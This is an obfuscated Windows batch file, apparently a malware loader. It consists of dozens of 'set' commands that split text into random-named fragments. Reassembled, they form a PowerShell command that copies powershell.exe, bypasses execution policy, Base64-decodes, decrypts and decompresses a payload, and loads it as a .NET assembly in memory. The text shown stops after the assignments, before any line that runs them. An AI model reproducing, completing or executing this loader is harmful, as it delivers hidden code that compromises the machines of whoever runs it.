@echo off
set "JNFItUnbht=in"
set "AoUhswMXSu= /"
set "mvIdtWwGte=1."
set "IsglGxDPtl=rS"
set "bGxUVMlXep=he"
set "NIQZkBRBpP=po"
set "bAPWEfJOxb=\v"
set "IUtaHBAJEV=ow"
set "cwzccfXOZw=we"
set "eVqEcoIlAb=ll"
set "SBGexgaQUD= C"
set "fMOwBKhVqr=.e"
set "IRYKrntsMI=Sy"
set "MmVOfIKnDE=co"
set "hhWWspzUho=\W"
set "lJbkNkGRqY=nd"
set "ClaDeLHgNV=do"
set "XuDATjjgcu=:\"
set "yoUQYOxiSk=Wi"
set "HoYTSEHPgI=s\"
set "CUBpQWgsRH=we"
set "WdjxeQuaoq=py"
set "oODWCXLhrj=em"
set "DRKIpQWJJt=32"
set "IlkQphSHDn=ws"
set "kaMOxShzdD=y "
set "yQadzPlbpv=Po"
set "rdBUISmmQC=rs"
set "CsPdMEUTjx=st"
set "FVVEnDFITR=he"
set "KioCgcANSS=0\"
set "AFRssNKVZt=ll"
set "pFKNkgBVOz=xe"
set "WmYKTzclTO=cd"
set "GfoKLiIIrA= %~dp0"
set "wDHqQSHihk=rz ="
set "cTDGdyNKrx=raph"
set "jZtWtrPYTv=  $p"
set "LyKTZiKGfJ=join"
set "EYmjvqbYsO=t Sy"
set "nnlCYsbVzG=ZbYp"
set "uBTdlXiDTh=New-"
set "bhycAxFQup=gth)"
set "hChaHyMUUr=[Env"
set "NaNbgagyaA=;$GK"
set "eguvFLQnbx=:('g"
set "BWcabzjvhw=.-16"
set "bOPrqISEqJ=y.Cr"
set "fwmSWStuKt=3); "
set "hEeiEFZnrR=)($p"
set "jTuIKcjziv=('%*'"
set "gXOqNnYIRW== [S"
set "jcLFyTzSIe=ose("
set "PCvJdktopL=am;$"
set "aqPLEHCmFO=morF"
set "KWmGrZOxPY=fore"
set "mAKAimJynJ=LoUd"
set "WfsXythUpA=ohrz"
set "HbvhlEqckp=hy.A"
set "XuKmlyLcck=[Sys"
set "FGqPBmumNl=ose("
set "xPvJbhKqLm=Star"
set "mYnIApEhwx= = ["
set "OdILWQSlqL=iron"
set "fODkxKOaDw=.IO."
set "TAhdpxpzjr=JpBG"
set "ZJqnOFGeTh=rt]:"
set "lrtrdFxiFn=brea"
set "qBlHECBZHj=('l0"
set "KKPjcnpsUL=d;$u"
set "ujxlfuAbYq=Comp"
set "bklsbFKooK=v4Ir"
set "mXwQAXYHQJ= [st"
set "lwfyDsPjXA=ach "
set "LdWEHcJZRO=p.Pa"
set "vTOpFxufDs=saBm"
set "bQApmmQqTg=yste"
set "vHMOPLaCXs=.Cop"
set "mFlkfOCoFU=pDZz"
set "LgIUIIHlFd=[IO."
set "mKgGkLLHco=bstr"
set "ZHyihNfMsW=Conv"
set "sxpnejcKzo=ct S"
set "JyfAlMwSzw=Secu"
set "nfQuPVWIgU= if "
set "aHPUnNqwDY=ect "
set "QaMXRnHVQt=y.Pa"
set "MAaVpypjbz=ptog"
set "oeyKcilRNC=ptog"
set "mQgPWtiDOa=U = "
set "DoDoGquOaN=);$u"
set "pnJIhMbxNt=esMa"
set "XBukDwaOMJ=Stre"
set "knOGIShrGX=esFX"
set "NkKUwfyUvW=ddin"
set "GAhKCyFEKv=le  "
set "vLWgetQjKj=y]::"
set "FVdzSjhsir=rz);"
set "tceDfTMnDz=ing("
set "LPhYtADCbq=7;$u"
set "tPIqHNmUzU=($Gh"
set "XpWkFCnyzO=dT ="
set "nsJAodYAcv=pose"
set "AIIsxxOyPR=ode]"
set "yjoLuIIxNm=New-"
set "gOVIXCAJOk= New"
set "iKjuoFjCSQ= '')"
set "lzLwFCjUlb=S46e"
set "LdTVPSzfvS=Obje"
set "QpwIKXEpkO=, $V"
set "mZURFcYSlt=-Obj"
set "UxdFPVVPua=oryS"
set "ITdcuHuwFd=-joi"
set "idkcCiOttI=bjec"
set "oynMUeXNTp= = $"
set "NQsVgYXskM=rity"
set "rfVMLqKoRD=yste"
set "VDOswzYauk=O.Me"
set "WAhYwlKRWo=..-1"
set "bbMzeLQSuE=yTo("
set "BwGCFoLqHK=tS46"
set "iiGyoaKqLt=n ''"
set "yBDcREkRHL=urit"
set "cxpAQJSdDf='')("
set "qxmOtHCJEU=($Gh"
set "YFqsEqwgRD=] -j"
set "wWWyVEZTIc=sGUc"
set "INJqgEbgMb=comp"
set "DGzPhIzfua=oin "
set "HjpHelecDx=-4] "
set "DxadbdMhfA=ew-O"
set "ltQXdWjmfx=ptor"
set "tlSvcqLxsD=tion"
set "OpQAPAsWkM=oArr"
set "bQBfrJZGYv=Obje"
set "lUOEWnsDUz=n ''"
set "FIENzkMGEV=m.Re"
set "GUKMYhGjkF=, (,"
set "eeHjArBLYW=-ep "
set "CWTDKjQxvC=z = "
set "dZdsriXlZe=m.IO"
set "hefnpdjjbk=hd);"
set "hZSOEDMwor=();$"
set "gyoubiMbVf=SHGX"
set "fFrEbGiJsR=Bmor"
set "dChWoxwYCp=1] -"
set "TNtIVEuXQc=[-1."
set "PwzIquTenJ=);$w"
set "JeeedSFcAB=.Len"
set "ZjjJwYwGMJ=ct S"
set "vwOEnDRNLX=ZbYp"
set "LFUmuIfkrM='[-1"
set "ZUPcmrOEOr=pose"
set "GKZWIYyQtI=vj0m"
set "jJltroSaEc=ay()"
set "GBvqeTbZyu=rtS4"
set "UQEmwYorym=;$NH"
set "xxTnNtHmGf=daeR"
set "MlvBqSPCOr=ck($"
set "czJUsIqVZR=$LoU"
set "gLGUzmuEAt=.Cry"
set "lYpLsPhOvO=gF, "
set "yZGdflWWgY=g = "
set "MfEISetEHG=Mode"
set "OveTbATGtC=B.Su"
set "hyCQBXLZcD='[-1"
set "UKNKbMkrFS=NVj."
set "NczenzgOas=Vohr"
set "ZqkYbFcLIT=ecry"
set "aioYghQUtb=NVj "
set "xZyBIMuLLQ=);$G"
set "iphzPALvdy=vert"
set "CDxQqrUJrx=;$SH"
set "NonfMqpNEb=Disp"
set "XHzigPMuAz=736u"
set "wICclvaJva=[Sys"
set "DSFGWUwaLw=hd ="
set "JSezQslENI= [Sy"
set "nEMGMSHXnj=stem"
set "srXIdcINAz=$Voh"
set "NhHLktfxyb=Syst"
set "rrizeDNMww=tem."
set "ypobsDojxz=('da"
set "MqZZJKTSAn==');"
set "uvRkKSwynP=.Cry"
set "SGxqbhWdBw=Vj.T"
set "hsqJCzSqDT=ewLi"
set "EQhrzdtgZI=ionM"
set "BHwIgGCGUu=qdB."
set "wLhrDsCpyM=]::("
set "uWmynkRajx=yste"
set "BSFCFEozUn= [Sy"
set "GGnLrBySpc=$weU"
set "oXvHhlfJsD=qdB "
set "nkWKhSvdFT=-1.."
set "fMgQYMOdec=e]::"
set "nhnUlWVzja=ispo"
set "yMXYBwCzNn=Vohr"
set "dvhnTNqabY=..-1"
set "BsdVaWdBBH=embl"
set "yCcCTbnFWL=xjNk"
set "oXwXeJsHSY=pher"
set "ZGqJtZvyJk=null"
set "VqlpJVoUcf='txe"
set "NFTzrnUAhr=esaB"
set "dwNMjJumOO=ss -"
set "hbfwDqnwlu=$weU"
set "lybPSNrcbV=ZYYc"
set "eepPJndbpR=$Voh"
set "CBgygXRrQv='gni"
set "ldgQwesiGl=mory"
set "mYWFOvsthT=GXa "
set "GVdFFbZDuv=orF'"
set "tpOMwEtYpA=:: '"
set "hQyoMbabdR=Comp"
set "sXKNTtLTKk=nirt"
set "QvfCqnVwew=ZbYp"
set "OfKDhzvNIb=ress"
set "PiKCjaxwtx=$NHN"
set "QskiSQSexV=lBlo"
set "RewNwGwlXy=Vohr"
set "jAkGLSTdTn=stem"
set "kjmaucucpm=$GKe"
set "bkGHOYIEoW=.GZi"
